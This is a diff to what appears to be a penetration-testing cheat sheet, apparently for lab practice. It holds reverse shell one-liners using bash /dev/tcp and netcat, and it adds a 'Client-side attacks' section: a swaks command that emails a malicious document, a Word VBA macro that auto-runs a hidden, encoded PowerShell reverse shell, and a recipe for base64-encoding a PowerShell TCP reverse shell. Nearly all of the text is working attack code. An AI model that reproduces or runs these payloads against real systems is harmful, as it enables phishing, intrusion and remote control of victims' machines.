@@ -54,6 +54,30 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.X/443 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 443 >/tmp/f
 nc -e /bin/bash 10.10.14.X 443
 ```
+
+### Client-side attacks
+```bash
+swaks --to victim@target --from me@kali --server 10.10.X.X --body "see attached" --attach @evil.docx
+```
+
+```vbs
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim str As String
+    str = "powershell -nop -w hidden -e <BASE64_ENCODED_REVSHELL>"
+    CreateObject("Wscript.Shell").Run str, 0, False
+End Sub
+```
+
+```bash
+PAYLOAD='$c=New-Object System.Net.Sockets.TCPClient("10.10.14.X",443);...'   # your PS revshell
+echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
+```
 ## Active Directory
 
 ### God-potato
